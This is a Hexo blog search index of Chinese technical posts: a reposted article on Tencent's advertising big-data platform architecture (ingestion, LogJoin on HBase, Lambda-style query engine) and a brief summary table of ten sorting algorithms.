<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>腾讯广告大数据平台核心架构设计</title>
      <link href="/2021/11/22/%E8%85%BE%E8%AE%AF%E5%B9%BF%E5%91%8A%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1/"/>
      <url>/2021/11/22/%E8%85%BE%E8%AE%AF%E5%B9%BF%E5%91%8A%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%B9%B3%E5%8F%B0%E6%A0%B8%E5%BF%83%E6%9E%B6%E6%9E%84%E8%AE%BE%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<p>腾讯广告大数据架构</p><a id="more"></a><blockquote><p>转载自<a href="https://mp.weixin.qq.com/s/1bVUOnKgpC5mjCvCz4TLdg" target="_blank" rel="noopener">广告大数据平台核心架构设计</a>，侵删</p><p>本篇文章讲解了腾讯广告大数据的整体架构，讲解了具体细分的模块以及多年的更新迭代，个人觉得对大数据领域的广告业务很有参考价值，故转载。</p></blockquote><p>腾讯广告平台产品部大数据平台承担着腾讯视频、腾讯新闻客户端、腾讯网、腾讯体育、QQ音乐等腾讯系媒体和部分外部媒体的广告数据的接入、处理和应用。在过去的几年中，伴随着广告业务的快速发展，大数据平台架构也经历了一系列的升级。本文将从广告数据接入、处理、应用三个层面剖析大数据平台的核心架构设计，重点分享百亿级广告日志数据的接入架构设计（云落地系统）、广告数据  session 化实现（ logjoin 系统)、PB 级数据的 OLAP 查询 Lambda 架构设计。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20211122145919366.png" srcset="/img/loading.gif" lazyload="" alt="图1. 大数据平台整体架构"></p><h2 id="1-数据接入"><a href="#1-数据接入" class="headerlink" title="1 数据接入"></a><strong>1 数据接入</strong></h2><hr><p>大数据平台接入的数据主要包括3个大类：业务维度数据、媒体流量数据、广告流量数据，如图2所示。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20211122145950146.png" srcset="/img/loading.gif" lazyload="" alt="图2. 数据接入架构"></p><h3 id="1-1-业务维度数据"><a href="#1-1-业务维度数据" class="headerlink" title="1.1 业务维度数据"></a><strong>1.1 业务维度数据</strong></h3><hr><p>业务维度数据主要包括广告客户数据、广告下单数据、广告排期数据、广告位数据，这些数据原生位于广告投放体系中的其他业务系统如CRM系统、Order系统、Planning系统。大数据平台使用3种方式获取这种维度数据：</p><p>1）业务提供数据接口，平台主动拉</p><p>2）业务提供表schema/IP/端口，平台编写业务逻辑SQL，主动拉取</p><p>3）平台提供接口，业务主动调用接口上传</p><h3 id="1-2-媒体流量数据"><a href="#1-2-媒体流量数据" class="headerlink" title="1.2 媒体流量数据"></a><strong>1.2 媒体流量数据</strong></h3><hr><p>媒体流量数据来源于媒体，主要包括腾讯视频播放数据、腾讯新闻浏览数据，这些媒体数据通过腾讯公司级数据仓库TDW出库到大数据平台侧的Hadoop集群。媒体流量数据主要有两大类用途：</p><p>1）结合媒体数据分析广告的投放效果和售卖效果</p><p>2）ETL清洗后为算法服务提供原始特征数据</p><h3 id="1-3-广告流量数据"><a href="#1-3-广告流量数据" class="headerlink" title="1.3 广告流量数据"></a><strong>1.3 广告流量数据</strong></h3><hr><p>广告流量数据包括广告的检索、曝光、点击数据，是整个大数据平台自有的核心数据。鉴于腾讯视频、腾讯新闻客户端、腾讯网等媒体的巨大流量（日均百亿级广告PV、峰值QPS40万），如何采集和传输这海量广告日志数据成为大数据平台首先需要面对的挑战，这个挑战主要体现在以下3个方面：</p><p>1）数据总量大、峰值压力高</p><p>2）数据的可靠性、实时性要求极高</p><p>3）业务数据种类繁多且业务变化快</p><p>因此，一个良好的数据采集传输系统需要具备下述特性：</p><p>1）高可靠性和高可扩展性，完善的容错和负载均衡机制，可水平扩展的处理能力；</p><p>2）支持离线分析系统和实时计算系统；</p><p>3）能够灵活快速响应业务需求，实现数据字段新增、修改。</p><p>大数据平台2016年前的广告流量数据接入架构如图3-1所示。在这套广告流量数据接入架构中，广告流量数据落地功能是和业务server耦合的，共同部署在接入层server上，通过本地的各配置文件生成多个落地器，在单机上实现数据分拣（分拣：不同流量来源的数据落地到不同的目的路径），并按照配置的字段挑选数据。落地数据定时批量从server磁盘上传HDFS集群。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20211122150022801.png" srcset="/img/loading.gif" lazyload="" alt="图3 - 1. 广告流量数据接入架构（就）"></p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20211122150047975.png" srcset="/img/loading.gif" lazyload="" alt="图3 - 2. 广告流量数据接入架构（新）"></p><p>这个广告流量数据接入架构的主要缺陷在于：</p><p>1）通过白名单式的配置挑选落地字段，没有完整请求数据，没有可恢复的数据现场</p><p>2）和业务server重度耦合，每条数据都要串行遍历所有落地器处理，性能较差</p><p>3）配置修改比较复杂，在业务较多的服务，如点击服务器，修改配置的复杂度不低于修改代码，易出错</p><p>4）业务变化涉及众多服务器升级，运维工作量大，一致性难保证。</p><p>为了解决这个广告流量数据接入架构存在的上述问题，大数据平台对此架构进行了重构升级，搭建了新一代广告流量数据接入系统——云落地。云落地系统的设计目标是建成广告效果数据总线以实现数据集中接入、秒级实时处理、下游业务各取所需、业务变更不停数据流。</p><p>云落地系统主要由Storm、TDBank(腾讯自研的分布式消息队列)、Hadoop等分布式系统组件构建，总体架构采用分层结构，如图4所示。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20211122150113763.png" srcset="/img/loading.gif" lazyload="" alt="图4. 云落地系统架构"></p><p>业务服务器包含云落地系统所对接的各种业务日志服务器。发送Agent包含收集业务日志数据并进行转发的Sender。传输层使用TDBank，接收Agent发送的日志数据。核心分拣层包含2个分拣引擎：实时分拣引擎以及作为容错机制的离线分拣引擎。实时分拣在Storm Topology中实现。离线分拣使用Hadoop MapReduce实现。当实时分拣数据流出现问题时，可用离线分拣进行数据分拣，依然能保证数据完整性。存储层是HDFS分布式文件系统以及TDBank，其中HDFS存储支持下游离线数据应用，TDBank存储支持下游实时计算系统。云落地系统整体数据流如图5所示。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20211122150142550.png" srcset="/img/loading.gif" lazyload="" alt="图5. 云落地系统整体数据流"></p><p>云落地目前接入了腾讯网，腾讯视频，腾讯新闻客户端，微信/手Q新闻插件等业务，已覆盖所有广平数据业务。日均接收原始请求数百亿级，峰值QPS 40W/S。平均处理延迟7.5s。云落地系统将服务和数据解耦，提高了业务响应能力；配置中心化，一个业务，只需要维护一个配置，数据一致性得到保障；Hadoop和Storm结合保证了数据接入和传输的高可靠性和高可扩展性；云落地系统强化数据总线概念，所有的数据都从云分拣“入”，所有的数据需求都从云分拣“出”。</p><h2 id="2-数据处理"><a href="#2-数据处理" class="headerlink" title="2 数据处理"></a><strong>2 数据处理</strong></h2><h3 id="2-1-业务维度表构建"><a href="#2-1-业务维度表构建" class="headerlink" title="2.1 业务维度表构建"></a><strong>2.1 业务维度表构建</strong></h3><hr><p>针对上文中提到的业务维度数据，数据处理流程做的主要工作是生成一系列的维度表，这一系列的维度表将被用于数据建模时维度的扩展。例如对于广告下单数据，数据平台会生成以订单号oid为key的维度表，该维度表中还包括如客户ID，广告排期等其他订单号相关的属性。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20211122150204557.png" srcset="/img/loading.gif" lazyload="" alt="图6. 维度表Schema设计"></p><p>一个维度表最终的物理存储形式为HDFS上的一个文件，大数据平台目前维护着数百份维度表，这些维度表的更新周期包括按天、按小时等等。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20211122150226743.png" srcset="/img/loading.gif" lazyload="" alt="图7. 维度表物理存储"></p><h3 id="2-2-媒体流量数据ETL"><a href="#2-2-媒体流量数据ETL" class="headerlink" title="2.2 媒体流量数据ETL"></a><strong>2.2 媒体流量数据ETL</strong></h3><hr><p>媒体流量数据通过TDW由媒体侧出库到大数据平台侧的Hadoop集群，之后数据平台将进行必要的数据清洗和转换以构建数据模型。</p><h3 id="2-3-广告流量数据ETL"><a href="#2-3-广告流量数据ETL" class="headerlink" title="2.3 广告流量数据ETL"></a><strong>2.3 广告流量数据ETL</strong></h3><hr><p>对于通过云落地系统接入的广告流量数据，ETL流程通过清洗、关联和转换以实现数据的一致性、完整性、标准化。数据平台2017年前的ETL流程和业界通用的ETL流程类似，通过离线的Map/Reduce程序对广告日志进行清洗、关联和转换,清洗程序包括小时级的和天级的，清洗程序的调度通过TDW LZ平台实现，如图8所示。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20211122150249741.png" srcset="/img/loading.gif" lazyload="" alt="图8. ETL清洗任务"></p><p>这种离线数据ETL方式主要存在以下问题：</p><p>1）数据时效性差: </p><p>采用离线清洗,不能给下游实时统计提供实时流量，下游统计分析仅支持到T+1（1表示小时或者天，绝大部分数据为天）</p><p>2）离线清洗计算引擎落后: </p><p>离线清洗基于Hadoop MapReduce, 一方面计算中间结果需要存放到hdfs中，效率较低，另一方面支持的算子仅有Map和Reduce，表达能力欠缺，需要手工写很多代码，较难维护。</p><p>针对以上不足，大数据平台在2017年对数据ETL系统进行了重构升级，升级后的ETL系统架构如图9所示。新的ETL系统由两大部分组成，实时ETL和离线ETL。</p><p>1）实时ETL: 基于实时LogJoin(下文会介绍)的输出，构建实时清洗，为下游实时业务提供基础数据。</p><p>2）离线ETL: 清洗计算引擎升级为spark，提升处理速度。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20211122150312441.png" srcset="/img/loading.gif" lazyload="" alt="图9. 实时ETL架构图"></p><p>实时ETL分事实数据生成维度数据Join两个主模块。事实数据生成模块主要负责数据过滤，转换，格式化处理，生成事实表模型；维度数据Join模块负责根据不同的实时业务需求，关联不同的维度数据。实时ETL生成的数据将被用于实时查询引擎实时数据的查询以及算法需要的实时特征数据。</p><h3 id="2-4-广告数据Session化"><a href="#2-4-广告数据Session化" class="headerlink" title="2.4 广告数据Session化"></a><strong>2.4 广告数据Session化</strong></h3><hr><p>广告数据session化，即构建从用户产生一个广告请求到曝光以及最终产生点击的session级数据模型，实时logjoin就是用来实现广告数据session化的系统。广告检索日志、曝光日志、点击日志三路数据将通过实时logjoin模块进行整合，曝光、点击数据只需携带关键信息，其他信息由检索数据填充。目前广告曝光点击等效果日志关联是离线任务方式执行，延迟至少2个小时，通过实时logjoin可以有效服务算法实时CTR。LogJoin整体架构图如图10所示。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20211122150334025.png" srcset="/img/loading.gif" lazyload="" alt="图10. 实时LogJoin架构"></p><p>LogJoin项目主要意义：</p><p>1）提升数据一致性。以发布测数据为准，曝光、点击、动作数据都向发布数据靠，保证数据一条线的一致性；</p><p>2）提升数据完整性。减少大字段导致的http截断等用户侧上报场景下的问题；</p><p>3）提升数据时效性。基于Storm做流式logjoin，秒级完成数据ETL。可供实时CTR预估，在线学习等，提升广告收益，并为海象等下游业务提速打下基础；</p><p>4）精简曝光点击请求上报，节省用户流量；</p><p>5）解耦SDK和数据采集，提升新需求的响应速度；</p><p>6）基础数据底层schema重构优化，对各种业务不同格式数据建立统一底层数据模型，降低系统复杂度；</p><p>7）实时补全日志，纬度信息更加丰富，可支持实时多维分析。</p><h3 id="核心业务逻辑"><a href="#核心业务逻辑" class="headerlink" title="核心业务逻辑"></a><strong>核心业务逻辑</strong></h3><p>LogJoin的核心业务逻辑是将用户产生的一个广告从请求到曝光以及最终产生点击的完整日志数据Join到一起，LogJoin通过将一个广告的请求、曝光、点击写到Hbase的同一行中的Column Family并通过不同的qualifier来标识请求、曝光、点击来实现Join的功能,如图11所示。LogJoin中数据的实时清洗以及读写HBase的操作都是在JStorm中完成。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20211122150359628.png" srcset="/img/loading.gif" lazyload="" alt="图11. 实时LogJoin业务逻辑"></p><p>在HBase里一次广告检索对应后续的所有曝光和点击日志都保存在同一个RowKey对应的行，三种日志放在不同的列里，如图12所示。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20211122150438918.png" srcset="/img/loading.gif" lazyload="" alt="图12. 实时LogJoin HBase设计"></p><p>HBase设计中包含一个Family，其他数据包括</p><p>qualifier[common]  #检索日志中所有订单共享的信息，单列</p><p>qualifier[q_soid]   #检索日志中选中订单相关信息，每个soid占1列</p><p>qualifier[v_soid]   #曝光日志，每个曝光（soid）单独1列</p><p>qualifier[c_soid]   #点击日志，每个点击（soid）单独1列</p><p>LogJoin遇到的一个挑战是同一个用户的一次完整的广告session所产生的请求、曝光、点击数据是乱序上报的。对于用户的一次完整广告，理论上是按照先有请求，接着是曝光，最后是点击的顺序上报，但现实环境中，由于请求、曝光、点击日志数据在不同的服务器上产生，每台服务器的负载不同导致数据上报的速度不一致，这就造成LogJoin的JStorm程序会乱序接收到请求、曝光、点击数据，如图13所示。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20211122150506771.png" srcset="/img/loading.gif" lazyload="" alt="图13. 检索曝光点击乱序上报"></p><p>针对这种现象，LogJoin采用HBase行级锁并以CheckAndPut方式写入来保证数据的原子性。</p><h3 id="LogJoin-JStorm核心设计"><a href="#LogJoin-JStorm核心设计" class="headerlink" title="LogJoin JStorm核心设计"></a><strong>LogJoin JStorm核心设计</strong></h3><p>LogJoin的核心处理逻辑在JStorm中实现，核心设计如图14所示，设计要点：</p><p>1）流量隔离：按流量分为检索，曝光，点击等Spout，方便task数调整。</p><p>2）多线程&amp;批处理：提升并发度，减少网络IO，提升吞吐量batch_num设为50，性能提升5倍。</p><p>3）多级重试队列：提升点击join的时效性</p><p>4）在线升级：落地字段增减，分拣规则调整等在线升级</p><p>5）优雅重启：发送停止消费命令，先停止tube消费，再停止应用。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20211122150532231.png" srcset="/img/loading.gif" lazyload="" alt="图14. LogJoin JStorm核心设计"></p><h3 id="LogJoin-HBase核心设计"><a href="#LogJoin-HBase核心设计" class="headerlink" title="LogJoin HBase核心设计"></a><strong>LogJoin HBase核心设计</strong></h3><p>LogJoin中HBase设计要点是保证高吞吐与稳定性。HBase高吞吐与稳定性的保证主要通过RowKey的合理设计来防热点。LogJoin中HBase的RowKey长度设计固定为16字节，包括1字节前缀、2字节时间、13字节request_id，如图15所示：</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20211122150615727.png" srcset="/img/loading.gif" lazyload="" alt="图15. Rowkey设计"></p><p>唯一键为广告投放体系生成的的request_id，request_id的生成规则如下：</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20211122150644744.png" srcset="/img/loading.gif" lazyload="" alt="图16. request_id设计"></p><p>离线数据统计分析发现request_id不够散列，容易造成访问热点，需要增加散列前缀，因此RowKey中增加了1个字节长度的前缀，前缀计算方法为:</p><p>(byte)Math.abs(hashCode(request_id)%256)</p><p>RowKey中增加2字节的时间是为了实现基于时间局部性的IO优化。分析数据发现98%以上的Join动作可以在1分钟内完成，具有很强的时间相关性，BlockCache读缓存命中率低导致频繁访问HFile，造成IO利用率过高。对此的改进思路是尽可能的把相同时间的记录写到HFile中相邻的数据块(HBlock),从而提升 BlockCache缓存命中率。因此在RowKey中增加了时间信息，两个字节(小时,分钟)。效果是单机IO利用率从50%下降到20%以下。</p><p>针对HBase，LogJoin还做了一系列的优化，这些优化包括：预分区，避免region split带来集群访问毛刺;BlockCache优化提升读效率;启用压缩算法:节省存储空间;MajorCompaction优化: 禁用，夜间流量低时，定时手工触发。</p><p>截止目前，LogJoin系统运行指标：</p><p>1）高吞吐：日均接入60亿检索，16亿曝光，峰值QPS 20w/s</p><p>2）低延迟：数据秒级延迟，延迟（处理时间-数据时间）超过30s的比例&lt;0.16%, 超过60s的比例&lt;0.11%</p><p>3）Join成功率高：曝光join检索的成功率&gt;99.4%;点击join曝光和检索的成功率&gt;99%</p><p>4）业务效果: 实时CTR预估提升2%；点击过滤系统中可以将点击关联到的曝光、检索相关的信息作为过滤依据。</p><h2 id="3-数据服务"><a href="#3-数据服务" class="headerlink" title="3 数据服务"></a><strong>3 数据服务</strong></h2><hr><p>数据平台的数据服务可以分成在线数据服务和离线数据服务两大类。在线数据服务包括为实时CTR预估提供数据的LogJoin数据流、实时播控、点击过滤、计费，如图17所示。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20211122150717487.png" srcset="/img/loading.gif" lazyload="" alt="图17. 在线数据服务"></p><p>离线数据服务主要包括广告效果分析平台(Measurement)、广告运营分析平台(灯塔)以及自助查询OLAP系统 (盖亚 &amp; Walrus)、各个业务系统所需的广告执行数据的推送服务(涉及公司20+个部分，100+团队)。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20211122150744034.png" srcset="/img/loading.gif" lazyload="" alt="图18. 离线数据服务"></p><h3 id="3-1-数据建模"><a href="#3-1-数据建模" class="headerlink" title="3.1 数据建模"></a><strong>3.1 数据建模</strong></h3><hr><p>离线数据服务的核心是数据的建模以及基于建模的异构数据的OLAP查询。</p><p>数据建模的目标是基于业务视角，将原始的广告日志数据转化成业务所需的数据模型以便于业务侧的高效查询，这个过程中做的主要工作是维度的聚合、指标的计算。数据平台的数据模型包括实时模型和离线模型两个部分。</p><p>实时模型通过接入实时ETL的结果数据利用Spark-streaming或Storm进行窗口聚合提供40+维度的广告曝光点击数据的实时查询(数据延迟在分钟级)。</p><p>离线模型主要通过Spark或Hadoop任务基于任务DAG生成数据模型，数据平台现有模型21个，每个模型可查询维度40~250个，时间跨度为最近2年。</p><h3 id="3-2-数据查询"><a href="#3-2-数据查询" class="headerlink" title="3.2 数据查询"></a><strong>3.2 数据查询</strong></h3><hr><p>数据平台的数据查询服务主要包括两大类：</p><p>1）通用型的多维聚合类查询，如库存计算、频次计算</p><p>2）广告明细提取，人群包提取</p><p>数据查询的挑战在于：</p><p>1）数据量大（PB级别）、纬度多（单表200+纬）</p><p>2）查询时间跨度大、聚合纬度多</p><p>3）数据准确性高（不允许非精确值）</p><p>4）查询性能要求高</p><p>随着业务的不停增长，数据平台的查询引擎从也进行了一系列的升级</p><p>1）第1代：以开源Infobright为基础的查询引擎</p><p>2）第2代：以PIG为主要计算引擎的查询引擎(查询耗时小时级)</p><p>3）第3代：Rocket AdHoc查询引擎(查询耗时秒级)</p><p>4）第4代：当前的lambda架构查询引擎。</p><h4 id="第1代查询引擎"><a href="#第1代查询引擎" class="headerlink" title="第1代查询引擎"></a><strong>第1代查询引擎</strong></h4><p>Infobright是开源的MySQL数据仓库解决方案，它将列存储、高强度的数据压缩、优化的统计计算引入到了MySQL中，对于处理亿级规模以下的数据具有较好的性能，但无法支持百亿级、千亿级数据的查询。随着业务的发展，数据平台需要查询的数据规模达到了万亿级，Infobright因为其有限的吞吐量已不能满足业务需求。</p><h4 id="第2代查询引擎"><a href="#第2代查询引擎" class="headerlink" title="第2代查询引擎"></a><strong>第2代查询引擎</strong></h4><p>为了处理万亿级规模的数据，Pig被引入到了查询引擎中。Pig本质上是Map Reduce ON HDFS，由Yahoo在2006年开始开发，在2010成为Apache顶级项目。Pig是MapReduce的一个抽象，它提供了一种称为Pig Latin的高级语言来编写数据处理脚本。所有这些脚本都在Pig内部的Pig Engine组件转换为Map和Reduce任务。</p><p>Pig提供了丰富的运算符集如join，sort，filer等来操作数据;Pig内部也会对Pig脚本进行优化，开发人员只需要关注语言的语义而不需要过度关注底层Map Reduce实现;Pig提供UDF(用户定义函数)的功能,开发人员可以通过其他编程语言（如Java、Python）创建UDF的功能，并且可以调用或嵌入到Pig脚本中。</p><p>和其他基于Map Reduce的批处理工具类似，基于Pig的数据处理也是典型的IO密集型计算，其效率相对低下。对于例行化的批处理任务，Pig由于其支持大吞吐量的特性是一个不错的选择，但对于面向用户的查询引擎，Pig效率的低下(用户查询耗时在小时级)，越来越不能满足业务需求。</p><h4 id="第3代查询引擎"><a href="#第3代查询引擎" class="headerlink" title="第3代查询引擎"></a><strong>第3代查询引擎</strong></h4><p>为了解决基于Pig的查询引擎查询性能低下的缺陷，Rocket查询引擎应运而生，其架构如图19所示。Rocket查询引擎是SparkSQL和Paruqet存储格式的结合。数据平台查询引擎的业务特点是计算多个维度聚合下的指标，计算引擎的查询压力集中在reduce端，极易发生数据倾和大规模shuffle的触发。因此Rocket采用了大宽表结构的数据模型。通过合理的数据预处理和Parquet列式存储的选择，Rocket查询引擎将用户查询的时间开销降低到了秒级。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20211122150805588.png" srcset="/img/loading.gif" lazyload="" alt="图19. Rocket查询引擎架构图"></p><p>Rocket查询引擎的数据预处理包括：</p><p>1）大宽表构建：预先join所有常用维度;</p><p>2）String转Int：更高的数据压缩比、更好的查询性能；</p><p>3）行转列：高效数据压缩。</p><p>Rocket查询引擎的数据组织：</p><p>1）多分区方式：按全量、年、月分区，各分区独立schema、独立中间表。</p><p>2）多版本管理：读写分离</p><p>3）视图模型：多模型联合查询</p><p>4）广播模型： 小表预先broadcast</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20211122150831504.png" srcset="/img/loading.gif" lazyload="" alt="图20. Rocket查询引擎数据组织方式"></p><h4 id="第4代查询引擎"><a href="#第4代查询引擎" class="headerlink" title="第4代查询引擎"></a><strong>第4代查询引擎</strong></h4><p>数据平台当前的查询引擎采用了lambda架构的经典设计，相比于之前3代查询引擎只支持离线数据的查询，当前lambda架构引入了实时数据的查询。</p><p>Lambda 架构由Storm的作者NathanMarz提出，其设计目的在于提供一个能满足大数据系统关键特性的架构，包括高容错、低延迟、可扩展等。其整合离线计算与实时计算，融合不可变性、读写分离和复杂性隔离等原则，可集成Hadoop, Kafka, Spark，Storm等各类大数据组件。Lambda 架构可分解为三层Layer，即Batch Layer, Real-Time(Speed) Layer和ServingLayer。其中Batch Layer用于离线数据的处理和查询，Speed Layer用于实时数据的处理和查询，Serving Layer用于合并离线数据的查询结果和实时数据的查询结果作为最终的数据结果集。</p><p>当前查询引擎lambda架构如图21所示，该设计架构支持万级别数据的查询能力，支持任意纬度的聚合、明细提取，95%的任务查询时间开销在秒级。</p><p><img src="https://cdn.jsdelivr.net/gh/ChoiNgai/ImageServer/img/image-20211122150900580.png" srcset="/img/loading.gif" lazyload="" alt="图21. 查询引擎Lambda 架构设计"></p><p>在接口层，当前架构支持两种类型的接口，包括HTTP接口和类SQL查询，{模型名，时间范围，筛选条件，聚合维度，指标} 五元素定义一个查询。在视图层，当前架构屏蔽了底层异构计算引擎；屏蔽模型中实体表与维度表的关联关系，对外以大宽表形式，降低使用门槛。在计算层，当前架构整体构建在spark on yarn之上。</p><p>当前查询引擎的运营指标数据：</p><p>1)当前对外开放查询数据总量：1.5P</p><p>2)当前对方开放查询数据维度：250+</p><p>3)日均查询读取数据量：500T</p><p>4)近半年数据推送及查询涉及团队：28个部门、112个团队</p><p>5)曝光收入类查询中位数耗时15s</p><p>本文从数据接入、数据处理、数据应用三个层面剖析了大数据平台的架构设计，鉴于篇幅的限制，本文无法对数据平台中的每一个模块进行细致而全面的介绍，之后我们将通过开辟新的文章的方式对上文中提到的核心系统进行全面的分享。除了上文中提到的应用和服务之外，数据平台还负责着统一缓存服务(提供用户的基础属性等的查询)、TencentAdId服务、Poseidon海量标签检索服务等相对独立的数据服务，后面我们也将对此进行分享。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 大数据技术 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据平台 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>十种常见的排序算法</title>
      <link href="/2021/11/21/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E6%B1%87%E6%80%BB/"/>
      <url>/2021/11/21/%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E6%B1%87%E6%80%BB/</url>
      
        <content type="html"><![CDATA[<p>常见的排序算法</p><a id="more"></a><h2 id="算法分类"><a href="#算法分类" class="headerlink" title="算法分类"></a>算法分类</h2><blockquote><p><strong>非线性时间比较类排序</strong>：通过比较来决定元素间的相对次序，由于其时间复杂度不能突破O(nlogn)，因此称为非线性时间比较类排序。</p><p><strong>线性时间非比较类排序</strong>：不通过比较来决定元素间的相对次序，它可以突破基于比较排序的时间下界，以线性时间运行，因此称为线性时间非比较类排序。</p></blockquote><div class="hljs code-wrapper"><pre class="mermaid">flowchart LR    P[排序算法] --&gt; A(非线性时间比较类排序)    P --&gt; B(线性时间非比较类排序)    A --&gt; A1(交换排序)    A1 --&gt; A11(冒泡排序)    A1 --&gt; A12(快速排序)    A --&gt; A2(插入排序)    A2 --&gt; A21(简单插入排序)    A2 --&gt; A22(希尔排序)    A --&gt; A3(选择排序)    A3 --&gt; A31(简单选择排序)    A3 --&gt; A32(堆插入排序)    A --&gt; A4(归并排序)    B --&gt; B1(基排序)    B --&gt; B2(桶排序)    B --&gt; B3(基数排序)</pre></div><h2 id="算法复杂度"><a href="#算法复杂度" class="headerlink" title="算法复杂度"></a>算法复杂度</h2><table><thead><tr><th>排序算法</th><th>时间复杂度（平均）</th><th>时间复杂度（最好）</th><th>时间复杂度（最坏）</th><th>空间复杂度</th><th>稳定性</th></tr></thead><tbody><tr><td>冒泡排序</td><td>$O(n^2)$</td><td>$O(n)$</td><td>$O(n^2)$</td><td>$O(1)$</td><td>稳定</td></tr><tr><td>选择排序</td><td>$O(n^2)$</td><td>$O(n^2)$</td><td>$O(n^2)$</td><td>$O(1)$</td><td>不稳定</td></tr><tr><td>插入排序</td><td>$O(n^2)$</td><td>$O(n)$</td><td>$O(n^2)$</td><td>$O(1)$</td><td>稳定</td></tr><tr><td>希尔排序</td><td>$O(n \log  n)$</td><td>$O(n \log n)$</td><td>$O(n^2)$</td><td>$O(1)$</td><td>不稳定</td></tr><tr><td>归并排序</td><td>$O(n \log n)$</td><td>$O(n \log n)$</td><td>$O(n \log n)$</td><td>$O(n)$</td><td>稳定</td></tr><tr><td>快速排序</td><td>$O(n \log n)$</td><td>$O(n \log n)$</td><td>$O(n^2)$</td><td>$O(\log n)$</td><td>不稳定</td></tr><tr><td>堆排序</td><td>$O(n \log n)$</td><td>$O(n \log n)$</td><td>$O(n \log n)$</td><td>$O(1)$</td><td>不稳定</td></tr><tr><td>计数排序</td><td>$O(n+k)$</td><td>$O(n+k)$</td><td>$O(n+k)$</td><td>$O(k)$</td><td>稳定</td></tr><tr><td>桶排序</td><td>$O(n+k)$</td><td>$O(n+k)$</td><td>$O(n^2)$</td><td>$O(n+k)$</td><td>稳定</td></tr><tr><td>基数排序</td><td>$O(n \times k)$</td><td>$O(n \times k)$</td><td>$O(n \times k)$</td><td>$O(n+k)$</td><td>稳定</td></tr></tbody></table><blockquote><p><strong>稳定</strong>：如果a原本在b前面，而a=b，排序之后a仍然在b的前面</p><p><strong>不稳定</strong>：如果a原本在b的前面，而a=b，排序之后 a 可能会出现在 b 的后面</p></blockquote><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://mp.weixin.qq.com/s/ZLjGz2Tci3a-2Mj152Oosg" target="_blank" rel="noopener">十大经典排序算法</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据结构 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《Java核心技术 卷I》阅读笔记</title>
      <link href="/2021/11/20/%E3%80%8AJava%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF-%E5%8D%B7I%E3%80%8B%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"/>
      <url>/2021/11/20/%E3%80%8AJava%E6%A0%B8%E5%BF%83%E6%8A%80%E6%9C%AF-%E5%8D%B7I%E3%80%8B%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/</url>
      
